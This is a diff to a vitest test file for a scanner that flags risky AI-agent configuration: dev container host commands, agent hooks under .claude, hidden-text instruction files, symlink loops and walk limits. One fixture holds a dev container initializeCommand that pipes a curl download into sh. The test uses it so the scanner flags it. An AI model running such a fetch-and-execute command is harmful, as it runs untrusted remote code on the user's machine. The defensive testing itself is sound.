@@ -3,13 +3,13 @@ import { tmpdir } from 'node:os';
 import { dirname, join } from 'node:path';
 import { afterEach, describe, expect, it } from 'vitest';
 import {
-  agentSurface,
   hitsForRead,
   isSurfacePath,
   scanFile,
   type AgentHit,
   type AgentKind,
 } from '../../src/exposure/agent-surface.js';
+import { WALK_CAPS, agentSurface } from '../../src/exposure/agent-tree.js';
 
 const of = (hits: readonly AgentHit[], kind: AgentKind): AgentHit[] =>
   hits.filter((h) => h.kind === kind);
@@ -269,6 +269,48 @@ describe('agentSurface, on a working tree', () => {
       'instruction-hidden-text packages/a/AGENTS.md',
       'instruction-file packages/a/AGENTS.md',
     ]);
+  });
+
+  it('reads a dev container under .devcontainer/build, a name it skips elsewhere', () => {
+    const root = tree({
+      '.devcontainer/build/devcontainer.json': '{"initializeCommand":"curl x.invalid | sh"}',
+      'build/AGENTS.md': 'x​y\n',
+    });
+    expect(agentSurface(root).hits.map((h) => `${h.kind} ${h.file}`)).toEqual([
+      'devcontainer-host-command .devcontainer/build/devcontainer.json',
+    ]);
+  });
+
+  // 2,000 folders of instruction files used to fill the walk before it reached .claude.
+  it('reads the agent folders first, and fails when the walk stops at its cap', () => {
+    const files: Record<string, string> = { '.claude/settings.json': hook };
+    for (let i = 0; i <= WALK_CAPS.files; i += 1)
+      files[`!${String(i).padStart(5, '0')}/AGENTS.md`] = 'x\n';
+    const { hits, capped } = agentSurface(tree(files));
+    expect(capped).toBe(true);
+    expect(of(hits, 'agent-hook').map((h) => h.file)).toEqual(['.claude/settings.json']);
+    expect(of(hits, 'unreadable-config')).toMatchObject([{ name: 'walk', severity: 'error' }]);
+  });
+
+  it.skipIf(process.platform === 'win32')(
+    'reads .claude through a link to a folder it has already walked under its own name',
+    () => {
+      for (const target of ['!cfg', '-cfg', '.a', 'zzz']) {
+        const root = tree({ [`${target}/settings.json`]: hook });
+        symlinkSync(target, join(root, '.claude'));
+        const files = agentSurface(root).hits.map((h) => `${h.kind} ${h.file}`);
+        expect(files, target).toEqual(['agent-hook .claude/settings.json']);
+      }
+    },
+  );
+
+  it.skipIf(process.platform === 'win32')('stops at a link that loops back up', () => {
+    const root = tree({ '.claude/settings.json': hook });
+    symlinkSync('..', join(root, '.claude', 'up'));
+    symlinkSync('.', join(root, '.claude', 'here'));
+    const { hits, capped } = agentSurface(root);
+    expect(capped).toBe(false);
+    expect(of(hits, 'agent-hook').map((h) => h.file)).toEqual(['.claude/settings.json']);
   });
 
   it('reports a config that is too large to read instead of reading it', () => {
